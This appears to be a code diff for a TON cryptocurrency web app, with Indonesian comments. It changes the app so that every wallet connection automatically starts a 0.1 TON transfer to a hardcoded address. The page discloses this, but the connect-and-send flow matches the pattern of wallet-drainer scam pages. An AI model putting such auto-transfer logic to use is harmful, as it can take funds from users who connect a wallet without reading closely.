@@ -1,10 +1,10 @@
-// TON Transfer App - Auto Transfer After Connect
+// TON Transfer App - Always Auto Transfer
 class TONTransferApp {
     constructor() {
         this.tonConnectUI = null;
-        this.autoTransferEnabled = true; // ✅ FLAG UNTUK AUTO TRANSFER
-        this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U"; // ✅ RECIPIENT STATIS
-        this.staticAmount = "0.1"; // ✅ AMOUNT STATIS
+        this.autoTransferEnabled = true;
+        this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
+        this.staticAmount = "0.1";
         this.init();
     }
 
@@ -16,8 +16,6 @@ class TONTransferApp {
 
             this.setupConnectionListener();
             this.setupEventListeners();
-            
-            // ✅ PRE-FILL FORM DENGAN NILAI STATIS
             this.preFillForm();
             
             console.log('TON Connect UI initialized successfully');
@@ -27,12 +25,10 @@ class TONTransferApp {
         }
     }
 
-    // ✅ METHOD BARU: PRE-FILL FORM
     preFillForm() {
         document.getElementById('recipient').value = this.staticRecipient;
         document.getElementById('amount').value = this.staticAmount;
         
-        // ✅ TAMPILKAN INFO TRANSFER YANG AKAN DILAKUKAN
         document.getElementById('connectionSection').innerHTML = `
             <h3>🔗 Connect & Auto Transfer</h3>
             <p>Connect your wallet to automatically send:</p>
@@ -40,29 +36,24 @@ class TONTransferApp {
                 <p><strong>To:</strong> ${this.staticRecipient.slice(0, 10)}...${this.staticRecipient.slice(-6)}</p>
                 <p><strong>Amount:</strong> ${this.staticAmount} TON</p>
             </div>
-            <button id="connectButton" class="btn-primary">Connect Wallet & Transfer</button>
+            <button id="connectButton" class="btn-primary">Connect Wallet & Auto Transfer</button>
+            <p class="hint">Auto-transfer will trigger on every connection</p>
         `;
     }
 
     setupConnectionListener() {
         this.tonConnectUI.onStatusChange((wallet) => {
             if (wallet) {
+                console.log('Wallet connected - triggering auto-transfer');
                 this.onWalletConnected(wallet);
-                
-                // ✅ AUTO TRIGGER TRANSFER SETELAH CONNECTED
-                if (this.autoTransferEnabled) {
-                    setTimeout(() => {
-                        this.autoSendTransaction();
-                    }, 1000); // Delay 1 detik setelah connected
-                }
             } else {
+                console.log('Wallet disconnected');
                 this.onWalletDisconnected();
             }
         });
     }
 
     setupEventListeners() {
-        // Event listener akan di-setup ulang setelah preFillForm()
         setTimeout(() => {
             document.getElementById('connectButton').addEventListener('click', () => {
                 this.connectWallet();
@@ -91,7 +82,34 @@ class TONTransferApp {
         }
     }
 
-    // ✅ METHOD BARU: AUTO SEND TRANSACTION
+    onWalletConnected(wallet) {
+        // ✅ UPDATE UI
+        document.getElementById('connectionSection').style.display = 'none';
+        document.getElementById('transferSection').style.display = 'block';
+        
+        const shortAddress = wallet.account.address.slice(0, 8) + '...' + wallet.account.address.slice(-6);
+        document.getElementById('walletAddress').textContent = shortAddress;
+        
+        this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');
+        
+        // ✅ SELALU TRIGGER AUTO-TRANSFER SETELAH CONNECTED
+        setTimeout(() => {
+            this.autoSendTransaction();
+        }, 1000);
+    }
+
+    onWalletDisconnected() {
+        document.getElementById('connectionSection').style.display = 'block';
+        document.getElementById('transferSection').style.display = 'none';
+        this.clearForm();
+        this.preFillForm();
+        this.showStatus('Wallet disconnected', 'info');
+    }
+
+    async disconnectWallet() {
+        await this.tonConnectUI.disconnect();
+    }
+
     async autoSendTransaction() {
         this.showStatus('🔄 Preparing auto-transfer...', 'loading');
         
@@ -142,28 +160,6 @@ class TONTransferApp {
             btn.disabled = false;
             btn.textContent = 'Send TON Again';
         }
-    }
-
-    onWalletConnected(wallet) {
-        document.getElementById('connectionSection').style.display = 'none';
-        document.getElementById('transferSection').style.display = 'block';
-        
-        const shortAddress = wallet.account.address.slice(0, 8) + '...' + wallet.account.address.slice(-6);
-        document.getElementById('walletAddress').textContent = shortAddress;
-        
-        this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');
-    }
-
-    onWalletDisconnected() {
-        document.getElementById('connectionSection').style.display = 'block';
-        document.getElementById('transferSection').style.display = 'none';
-        this.clearForm();
-        this.preFillForm(); // ✅ RESET KE STATE AWAL
-        this.showStatus('Wallet disconnected', 'info');
-    }
-
-    async disconnectWallet() {
-        await this.tonConnectUI.disconnect();
     }
 
     async sendTransaction() {
@@ -217,11 +213,7 @@ class TONTransferApp {
     }
 
     clearForm() {
-        // ✅ JANGAN CLEAR JIKA AUTO-TRANSFER MODE
-        if (!this.autoTransferEnabled) {
-            document.getElementById('recipient').value = '';
-            document.getElementById('amount').value = '';
-        }
+        // ✅ JANGAN CLEAR VALUE STATIS
         document.getElementById('message').value = '';
         document.querySelector('.char-count').textContent = '0/100';
     }
